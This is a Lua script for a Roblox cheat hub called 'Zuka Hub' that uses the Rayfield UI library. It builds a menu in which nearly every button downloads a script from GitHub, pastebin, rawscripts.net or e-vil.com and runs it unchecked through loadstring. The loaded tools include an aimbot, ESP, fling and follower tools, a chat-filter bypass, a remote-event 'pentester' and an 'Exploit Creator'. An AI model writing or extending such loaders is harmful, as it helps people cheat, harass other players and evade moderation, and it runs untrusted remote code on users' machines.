local debugX = true

-- prevent double-loading
if getgenv().ZukaLuaHub then
    warn("Zuka Hub is already loaded. (You can comment this guard for testing.)")
    -- For testing, do NOT return here. Comment out the return so you can debug loader issues.
    -- return
end
getgenv().ZukaLuaHub = true

-- load Rayfield safely
local _ok, _ray = pcall(function()
    print("[ZukaHub] Fetching Rayfield...")
    local src = game:HttpGet('https://sirius.menu/rayfield')
    print("[ZukaHub] Rayfield script length:", src and #src or "nil")
    local loader, err = loadstring(src)
    if not loader then error("Rayfield loadstring failed: " .. tostring(err)) end
    local lib = loader()
    print("[ZukaHub] Rayfield loaded:", lib and typeof(lib))
    return lib
end)
if not _ok or not _ray then
    warn("Failed to load Rayfield library; Zuka Hub cannot continue.")
    print("Rayfield load error:", tostring(_ray))
    return
end
local Rayfield = _ray

print("[ZukaHub] Creating Rayfield window...")
local Window = Rayfield:CreateWindow({
    Name = "Zuka Hub",
    LoadingTitle = "- Zuka Tech Internal -",
    LoadingSubtitle = "(Where skill meets ambition.)",
    Theme = "Default",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "ZukaHub"
    },
    KeySystem = false
})
print("[ZukaHub] Rayfield window created.")

-- === Commands Tab ===
local CommandsTab = Window:CreateTab("Commands", 4483362458)

-- === External Addons Section ===
local ExternalSection = CommandsTab:CreateSection("Main Addons")

-- helper for quick button creation
local function normalizeUrl(url)
    if not url or type(url) ~= "string" then return url end
    -- fix common GitHub blob/refs/heads patterns
    if url:find("raw.githubusercontent.com") then
        return url
    end
    if url:find("github.com") then
        url = url:gsub("https://github.com/", "https://raw.githubusercontent.com/")
        url = url:gsub("/blob/", "/")
        url = url:gsub("/tree/", "/")
        url = url:gsub("/refs/heads/", "/")
        return url
    end
    -- convert pastebin short links to raw
    if url:find("pastebin.com/") and not url:find("pastebin.com/raw/") then
        return url:gsub("pastebin.com/", "pastebin.com/raw/")
    end
    return url
end

local function safeButton(name, url, successMsg)
    CommandsTab:CreateButton({
        Name = name,
        Callback = function()
            local finalUrl = normalizeUrl(url)
            local fetchOk, src = pcall(function()
                return game:HttpGet(finalUrl)
            end)
            if not fetchOk or not src then
                warn("Failed to fetch " .. tostring(name) .. " from " .. tostring(finalUrl))
                return
            end
            local func, loadErr = loadstring(src)
            if not func then
                warn("Failed to load string for " .. tostring(name) .. ": " .. tostring(loadErr))
                return
            end
            local ranOk, runErr = pcall(func)
            if ranOk then
                print(successMsg or (name .. " Loaded"))
            else
                warn("Error running " .. tostring(name) .. ": " .. tostring(runErr))
            end
        end
    })
end

-- External command buttons
safeButton("Aimbot", "https://raw.githubusercontent.com/scriptlisenbe-stack/luaprojectse3/refs/heads/main/trashaimbot.lua", "Aimbot Started")
safeButton("Fly GUI", "https://raw.githubusercontent.com/396abc/Script/refs/heads/main/FlyR15.lua", "Fly GUI Started")
safeButton("Admin UI", "https://raw.githubusercontent.com/bloxtech1/luaprojects2/refs/heads/main/zukaadminnameless.lua", "Admin Activated")
safeButton("Pentesting Remotes", "https://raw.githubusercontent.com/scriptlisenbe-stack/luaprojectse3/refs/heads/main/RemoteEvent_Pentester_OP.txt", "Sigma Loaded")
safeButton("Zenith Hub +", "https://raw.githubusercontent.com/Zenith-Devs/Zenith-Hub/main/loader", "Ui Activated")
safeButton("Wall-Walking", "https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/WallWalk.lua", "Swag Started")
safeButton("Script-Blox API", "https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/ScriptHubNA.lua", "Server Searcher Loaded")
safeButton("Universe Explorer", "https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/Universe%20Viewer", "Explorer Loaded")
safeButton("Server Hopper", "https://raw.githubusercontent.com/Pnsdgsa/Script-kids/refs/heads/main/Advanced%20Server%20Hop.lua", "Gui Started..")
safeButton("Fling GUI", "https://raw.githubusercontent.com/miso517/scirpt/refs/heads/main/main.lua", "Fling GUI Loaded")
safeButton("Blox Fruits", "https://rawscripts.net/raw/Arise-Crossover-Speed-Hub-X-33730", "Blox Fruits")
safeButton("Copy Console", "https://raw.githubusercontent.com/scriptlisenbe-stack/luaprojectse3/refs/heads/main/consolecopy.lua", "Loaded")
safeButton("Player Attach + Follower", "https://raw.githubusercontent.com/zukatech1/customluascripts/refs/heads/main/flingaddon.lua", "Follower GUI Loaded")
safeButton("Chams (ESP)", "https://raw.githubusercontent.com/zukatech1/customluascripts/refs/heads/main/esp.lua", "ESP Loaded")
safeButton("Working Chat Bypass", "https://raw.githubusercontent.com/shadow62x/catbypass/main/upfix", "Bypass Activated")
safeButton("Ketamine/Spy", "https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua", "Cherry Activated")
safeButton("ZukaBot AI V1", "https://raw.githubusercontent.com/zukatech1/customluascripts/refs/heads/main/Broken.lua", "Bot v1 Loaded")
safeButton("ZukaBot AI V2", "https://raw.githubusercontent.com/theogcheater2020-pixel/luaprojects2/refs/heads/main/chat.lua", "Bot v2 Loaded")
safeButton("Zombie Game Upd3", "https://raw.githubusercontent.com/osukfcdays/zlfucker/refs/heads/main/.luau", "Zombie GUI Started")
safeButton("Zombie Attack Auto", "https://raw.githubusercontent.com/evelynnscripts/Evelynn-Hub/refs/heads/main/zombie-attack.lua", "Hub Loaded")


-- === Utilities Section ===
local UtilityTab = Window:CreateTab("Utilities", 4483362458)
local UtilitySection = UtilityTab:CreateSection("Utilities")

UtilityTab:CreateButton({
    Name = "Rejoin Game",
    Callback = function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
    end
})

UtilityTab:CreateButton({
    Name = "Exploit Creator",
    Callback = function()
        loadstring(game:HttpGet("https://e-vil.com/anbu/rem.lua"))()
    end
})





-- === Cleanup Section ===
local CleanupTab = Window:CreateTab("Hub Settings", 4483362458)
local CleanupSection = CleanupTab:CreateSection("Hub Settings")

CleanupTab:CreateButton({
    Name = "Exit Zuka Hub",
    Callback = function()
        pcall(function() Rayfield:Destroy() end)
        getgenv().ZukaLuaHub = nil
        print("Zuka Hub unloaded and cleaned up.")
    end
})

-- === Load configuration last ===
print("[ZukaHub] Loading Rayfield configuration...")
Rayfield:LoadConfiguration()
print("[ZukaHub] Rayfield configuration loaded.")
